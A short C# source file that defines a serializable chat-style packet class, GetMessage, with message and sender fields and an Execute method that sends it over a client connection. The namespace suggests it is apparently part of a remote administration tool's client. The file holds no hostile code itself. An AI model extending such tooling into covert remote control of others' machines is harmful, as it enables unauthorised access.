using System;
using xClient.Core.Networking;

namespace xClient.Core.Packets.ServerPackets
{
    [Serializable]
    public class GetMessage : IPacket
    {
        public string Message { get; set; }
        public string Sender { get; set; }

        public GetMessage()
        {

        }
        public GetMessage(string message, string sender)
        {
            this.Sender = sender;
            this.Message = message;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}
